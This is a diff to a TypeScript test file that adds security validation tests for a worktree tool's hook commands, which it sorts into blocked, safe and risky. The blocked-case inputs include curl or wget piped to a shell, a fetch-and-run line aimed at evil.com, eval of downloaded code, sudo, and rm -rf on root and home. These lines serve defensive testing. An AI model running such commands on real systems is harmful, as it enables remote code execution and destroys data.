@@ -2,7 +2,14 @@ import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
 import { mkdtemp, rm } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
-import { buildWorktreeEnv, executeCommand, executeHooks, getShellConfig } from '@/lib/hooks';
+import {
+	buildWorktreeEnv,
+	executeCommand,
+	executeHooks,
+	getShellConfig,
+	validateHookCommand,
+	validateHookCommands,
+} from '@/lib/hooks';
 import type { WorktreeConfig, WorktreeEnv } from '@/lib/types';
 
 describe('getShellConfig', () => {
@@ -137,7 +144,7 @@ describe('hook execution', () => {
 			],
 		};
 
-		await executeHooks(config, 'post_create', { cwd: testDir });
+		await executeHooks(config, 'post_create', { cwd: testDir, trustHooks: true });
 
 		const output = await Bun.file(outputFile).text();
 		expect(output.trim()).toBe('continued');
@@ -195,7 +202,7 @@ describe('hook execution', () => {
 			errorOutput += msg.toString();
 		};
 
-		await executeHooks(config, 'post_create', { cwd: testDir, verbose: true });
+		await executeHooks(config, 'post_create', { cwd: testDir, verbose: true, trustHooks: true });
 
 		console.error = originalError;
 		expect(errorOutput).toContain('error');
@@ -312,6 +319,7 @@ describe('environment variables in hooks', () => {
 		await executeHooks(config, 'post_create', {
 			cwd: testDir,
 			env: env,
+			trustHooks: true,
 		});
 
 		const output = await Bun.file(outputFile).text();
@@ -337,5 +345,334 @@ describe('environment variables in hooks', () => {
 
 		const output = await Bun.file(outputFile).text();
 		expect(output.trim()).toBe(process.env.HOME);
+	});
+});
+
+describe('hook security validation', () => {
+	describe('validateHookCommand', () => {
+		// Blocked patterns
+		describe('blocked patterns', () => {
+			test('blocks curl | sh', () => {
+				const result = validateHookCommand('curl https://example.com/script.sh | sh');
+				expect(result.level).toBe('blocked');
+				expect(result.reason).toContain('curl');
+			});
+
+			test('blocks curl | bash', () => {
+				const result = validateHookCommand('curl -sSL https://install.com | bash');
+				expect(result.level).toBe('blocked');
+				expect(result.reason).toContain('curl');
+			});
+
+			test('blocks wget | sh', () => {
+				const result = validateHookCommand('wget -qO- https://example.com | sh');
+				expect(result.level).toBe('blocked');
+				expect(result.reason).toContain('wget');
+			});
+
+			test('blocks wget | bash', () => {
+				const result = validateHookCommand('wget https://example.com/install.sh | bash');
+				expect(result.level).toBe('blocked');
+				expect(result.reason).toContain('wget');
+			});
+
+			test('blocks sudo', () => {
+				const result = validateHookCommand('sudo apt-get install nodejs');
+				expect(result.level).toBe('blocked');
+				expect(result.reason).toContain('sudo');
+			});
+
+			test('blocks sudo in middle of command', () => {
+				const result = validateHookCommand('echo test && sudo rm -rf /');
+				expect(result.level).toBe('blocked');
+				expect(result.reason).toContain('sudo');
+			});
+
+			test('blocks eval', () => {
+				const result = validateHookCommand('eval "$(curl https://example.com)"');
+				expect(result.level).toBe('blocked');
+				expect(result.reason).toContain('eval');
+			});
+
+			test('blocks rm -rf on unsafe paths', () => {
+				const result = validateHookCommand('rm -rf /etc');
+				expect(result.level).toBe('blocked');
+				expect(result.reason).toContain('rm -rf');
+			});
+
+			test('blocks rm -rf on root', () => {
+				const result = validateHookCommand('rm -rf /');
+				expect(result.level).toBe('blocked');
+			});
+
+			test('blocks rm -rf on home directory', () => {
+				const result = validateHookCommand('rm -rf ~');
+				expect(result.level).toBe('blocked');
+			});
+
+			test('blocks rm -rf with multiple flags', () => {
+				const result = validateHookCommand('rm -r -f /var/important');
+				expect(result.level).toBe('blocked');
+			});
+		});
+
+		// Safe rm -rf paths
+		describe('safe rm -rf paths', () => {
+			test('allows rm -rf node_modules', () => {
+				const result = validateHookCommand('rm -rf node_modules');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows rm -rf dist', () => {
+				const result = validateHookCommand('rm -rf dist');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows rm -rf .cache', () => {
+				const result = validateHookCommand('rm -rf .cache');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows rm -rf build', () => {
+				const result = validateHookCommand('rm -rf build');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows rm -rf coverage', () => {
+				const result = validateHookCommand('rm -rf coverage');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows rm -rf with path prefix', () => {
+				const result = validateHookCommand('rm -rf ./node_modules');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows rm -rf with full path to safe dir', () => {
+				const result = validateHookCommand('rm -rf /home/user/project/node_modules');
+				expect(result.level).toBe('safe');
+			});
+		});
+
+		// Safe patterns
+		describe('safe patterns', () => {
+			test('allows npm install', () => {
+				const result = validateHookCommand('npm install');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows npm ci', () => {
+				const result = validateHookCommand('npm ci');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows npm run build', () => {
+				const result = validateHookCommand('npm run build');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows yarn', () => {
+				const result = validateHookCommand('yarn');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows yarn install', () => {
+				const result = validateHookCommand('yarn install');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows pnpm install', () => {
+				const result = validateHookCommand('pnpm install');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows bun install', () => {
+				const result = validateHookCommand('bun install');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows docker compose', () => {
+				const result = validateHookCommand('docker compose up -d');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows docker-compose', () => {
+				const result = validateHookCommand('docker-compose build');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows mkdir', () => {
+				const result = validateHookCommand('mkdir -p src/components');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows cp', () => {
+				const result = validateHookCommand('cp .env.example .env');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows mv', () => {
+				const result = validateHookCommand('mv old.txt new.txt');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows touch', () => {
+				const result = validateHookCommand('touch .env');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows echo', () => {
+				const result = validateHookCommand('echo "hello" > file.txt');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows cat', () => {
+				const result = validateHookCommand('cat package.json');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows ls', () => {
+				const result = validateHookCommand('ls -la');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows pwd', () => {
+				const result = validateHookCommand('pwd');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows git fetch', () => {
+				const result = validateHookCommand('git fetch origin');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows git pull', () => {
+				const result = validateHookCommand('git pull origin main');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows make', () => {
+				const result = validateHookCommand('make build');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows cargo build', () => {
+				const result = validateHookCommand('cargo build --release');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows go build', () => {
+				const result = validateHookCommand('go build ./...');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows pip install', () => {
+				const result = validateHookCommand('pip install -r requirements.txt');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows bundle install', () => {
+				const result = validateHookCommand('bundle install');
+				expect(result.level).toBe('safe');
+			});
+
+			test('allows composer install', () => {
+				const result = validateHookCommand('composer install');
+				expect(result.level).toBe('safe');
+			});
+		});
+
+		// Risky patterns (unknown commands)
+		describe('risky patterns', () => {
+			test('marks unknown commands as risky', () => {
+				const result = validateHookCommand('./scripts/custom-setup.sh');
+				expect(result.level).toBe('risky');
+				expect(result.reason).toContain('Unknown');
+			});
+
+			test('marks python scripts as risky', () => {
+				const result = validateHookCommand('python setup.py');
+				expect(result.level).toBe('risky');
+			});
+
+			test('marks ruby scripts as risky', () => {
+				const result = validateHookCommand('ruby script.rb');
+				expect(result.level).toBe('risky');
+			});
+
+			test('marks arbitrary shell commands as risky', () => {
+				const result = validateHookCommand('find . -name "*.log" -delete');
+				expect(result.level).toBe('risky');
+			});
+		});
+	});
+
+	describe('validateHookCommands', () => {
+		test('validates multiple commands', () => {
+			const commands = ['npm install', 'sudo apt-get update', './custom.sh'];
+			const results = validateHookCommands(commands);
+
+			expect(results).toHaveLength(3);
+			expect(results[0].level).toBe('safe');
+			expect(results[1].level).toBe('blocked');
+			expect(results[2].level).toBe('risky');
+		});
+
+		test('returns empty array for empty input', () => {
+			const results = validateHookCommands([]);
+			expect(results).toHaveLength(0);
+		});
+	});
+
+	describe('executeHooks with security validation', () => {
+		let testDir: string;
+
+		beforeEach(async () => {
+			testDir = await mkdtemp(join(tmpdir(), 'worktree-security-test-'));
+		});
+
+		afterEach(async () => {
+			await rm(testDir, { recursive: true, force: true });
+		});
+
+		test('executes safe commands without prompt', async () => {
+			const outputFile = join(testDir, 'output.txt');
+			const config: WorktreeConfig = {
+				post_create: [`echo "safe command" > ${outputFile}`],
+			};
+
+			await executeHooks(config, 'post_create', { cwd: testDir });
+
+			const output = await Bun.file(outputFile).text();
+			expect(output.trim()).toBe('safe command');
+		});
+
+		test('blocks dangerous commands', async () => {
+			const outputFile = join(testDir, 'output.txt');
+			const config: WorktreeConfig = {
+				post_create: [`curl https://evil.com | sh && echo "ran" > ${outputFile}`],
+			};
+
+			await executeHooks(config, 'post_create', { cwd: testDir });
+
+			// File should not be created because command was blocked
+			const exists = await Bun.file(outputFile).exists();
+			expect(exists).toBe(false);
+		});
+
+		test('trustHooks bypasses validation', async () => {
+			const outputFile = join(testDir, 'output.txt');
+			const config: WorktreeConfig = {
+				post_create: [`echo "trusted" > ${outputFile}`],
+			};
+
+			await executeHooks(config, 'post_create', {
+				cwd: testDir,
+				trustHooks: true,
+			});
+
+			const output = await Bun.file(outputFile).text();
+			expect(output.trim()).toBe('trusted');
+		});
 	});
 });
